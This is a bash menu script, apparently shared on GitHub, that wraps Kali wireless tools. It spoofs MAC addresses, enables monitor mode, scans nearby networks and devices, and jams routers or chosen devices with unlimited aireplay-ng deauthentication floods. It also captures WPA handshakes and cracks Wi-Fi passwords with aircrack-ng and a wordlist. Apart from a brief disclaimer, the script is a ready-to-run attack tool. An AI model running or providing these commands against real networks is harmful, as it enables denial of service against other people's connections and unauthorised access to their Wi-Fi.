echo -e "\n\e[1m*****************************************************************************************************************************************"
echo -e "*						 A Simple Networking Script By DMT HC4K3R		By Saviya				*"
echo  "*****************************************************************************************************************************************"


echo -e "\n\e[1;31m************************************************************************************************************************************** \e[0m"

echo -e "\e[1;31m               * Please Don't harm any device, Router and network or else I am not Responsible for any activity you Perfomed * \e[0m"


#\e[1;31m Text   \e[0m --->REd Color
echo -e "\n \e[1;31m                    * Please Connect your usb adapter that support Monitor Mode, if connected ignore this message * \e[0m\n"
    
echo -e " \e[1;31m                                            * This Script Must be run as root * \e[0m"
echo -e "\e[1;31m************************************************************************************************************************************** \e[0m"

echo -e "h) Help\n"
echo -e "u) Usage\n"
echo -e "a) About Script\n"
echo -e "0) Exit\n"
echo -e "1) Change MAC Address.\n"
echo -e "2) Change to Permanent Mac Address.\n"
echo -e "3) Activate Monitor Mode.\n"
echo -e "4) Deactivate Monitor Mode.\n"
echo -e "5) Find Nearby Networks.\n"
echo -e "6) Find Devices in particular wifi router.\n"
echo -e "7) Jam Any Nearby Wifi Router.\n"
echo -e "8) Jam particular Device in Wifi Router.\n"
echo -e "9) Want to Capture Handshake to hack Wifi ?\n"
echo -e "10) Want to Crack Password with aircrack-ng ?\n"
echo Select Operation :
read opt

if echo "$opt" | grep 'a'; then
	echo -e "\n\e[1m This is my first basic bash script that I am uploading on github, as this was created 1 year ago by me only. This Script  
can change your mac address, activate monitor mode, deactivate mode and also it can hack and jam wifi router and the devices 
that are connected in the wifi router. This Script is using airmon,aircrack,aireplay and airodump tool to jam and hack wifi. 
This Script is nothing but a collection of inbuilt tools in kali linux and I have just put 
the tools in bash script."

elif echo "$opt" | grep 'u'; then
	echo -e "\n\e[1mchmod +x *"
	echo -e "\nsudo bash network_hack.sh\n"
	
elif echo "$opt" | grep 'h'; then
	echo -e "\n\e[1m0). Exit- Exit Option."
	echo -e "1) Change MAC Address :- 
	This Option Will change your mac address using macchanger inbuilt tool in kali linux or parrot sec os.\n"
	echo -e "2) Change to Permanent Mac Address :- 
	This Option will change your mac to your permanent mac address using macchanger tool.\n"
	echo -e "3) Activate Monitor Mode :- 
	This Option will activate your monitor mode using airmon-ng inbuilt tool in kali linux parrot sec os.\n"
	echo -e "4) Deactivate Monitor Mode :- 
	This Option will De-activate your monitor mode using airmon-ng inbuilt tool in kali linux parrot sec os.\n"
	echo -e "5) Find Nearby Networks :- 
	This Option will use airodump-ng inbuilt tool in kali linux and parrot sec os to scan nearby routers.\n"
	echo -e "6) Find Devices in particular wifi router :- 
	This Option will use airodump-ng inbuilt tool in kali linux and parrot sec os to scan devices in particular wifi router.\n"
	echo -e "7) Jam Any Nearby Wifi Router :-
	This Option will use aireplay inbuilt tool in kali linux and parrot sec os to send deauth packets to wifi router.\n"
	echo -e "8) Jam particular Device in Wifi Router :-
	This Option will use aireplay inbuilt tool in kali linux and parrot sec os to send deauth packets to particualr device in wifi router.\n"

	echo -e "9) Want to Capture Handshake to hack Wifi ? :-
	This Option will use airodump-ng inbuilt tool in kali linux and parrot sec os to capture handshake of wifi. 
	This handshake file will will be further used to hack wifi. The extension of the file is .cap\n"
	echo -e "10) Want to Crack Password with aircrack-ng ? :-
	This Option will use aircrack-ng inbuilt tool in kali linux and parrot sec os to crack password of wifi. \n"




elif [[ $opt == 0 ]];then
	echo -e "\n\e[1;31m\e[91m\e[5m\e[1mExited..\e[0m\n\n\e[93m Thanks for Using the script..\n"

elif [[ $opt == 1 ]];then
	ifconfig wlan0 down
	macchanger -r wlan0
	ifconfig wlan0 up
	echo -e "\n\e[1mYour MAC address Changed\n"

elif [[ $opt == 2 ]];then
	ifconfig wlan0 down
	macchanger -p wlan0
	ifconfig wlan0 up
	echo -e "\n\e[1mYour MAC address Changed back to original Address..\n"

elif [[ $opt == 3 ]];then
	airmon-ng start wlan0
	echo -e "\n\e[1mMonitor mode Activated.."

elif [[ $opt == 4 ]];then
	airmon-ng stop wlan0mon
	echo -e "\n\e[1mMonitor mode De-activated.."


elif [[ $opt == 5 ]];then
    echo -e "\n\e[91m\e[1m First activate monitor mode. Just check 3rd option to activate monitor mode..!\n"
	airodump-ng wlan0mon


elif [[ $opt == 6 ]];then
	echo -e "Enter channel Number of router : \e[1m{ you can find channel number of router from option 5, if u got channel number of desired router then press ctrl+c to stop scan }"
	read ch
	echo -e "Enter mac address of router : \e[1m{ you can find mac address of router from option 5, if u got desired mac address of router then press ctrl+c to stop scan }"

	read mac
	airodump-ng --channel $ch --bssid $mac wlan0mon

  

elif [[ $opt == 7 ]];then
	echo -e "Enter mac address of router : \e[1m{ you can find mac address of router from option 5, if u got desired mac address of router then press ctrl+c to stop scan 
	and also set channel number from option 6 if got then press ctrl+c to stop.}"
	read mac
	aireplay-ng -0 0 -a $mac wlan0mon


elif [[ $opt == 8 ]];then

	echo -e "Enter mac address of router : \e[1m{ you can find mac address of router from option 5, if u got desired mac address of router then press ctrl+c to stop scan 
	and also set channel number from option 6 if got then press ctrl+c to stop.}"


	read macr
	
	echo -e "Enter mac address of Device : \e[1m{ you can find mac address of device from option 5, if u got desired mac address of device then press ctrl+c to stop scan }"

	read macd
	
	aireplay-ng -0 0 -a $macr -c $macd wlan0

elif [[ $opt == 9 ]];then
	echo -e "Enter mac address of router : "
	read macr
	
	echo -e "Enter the channel of router : "
	read channel
	
	echo -e "Enter the path were u want to save handshake : "
	read path
	airodump-ng --bssid  $macr --channel $channel --write $path wlan0


elif [[ $opt == 10 ]];then
	echo -e "Enter the path of captured handshake(.cap) : "
	read hand
	
	echo -e "Enter the path of wordlist : "
	read word
	
	aircrack-ng $hand -w $word 
else 
  echo -e "\n\e[91m\e[5m\e[1m Exited..due to invalid Input..\n"
fi
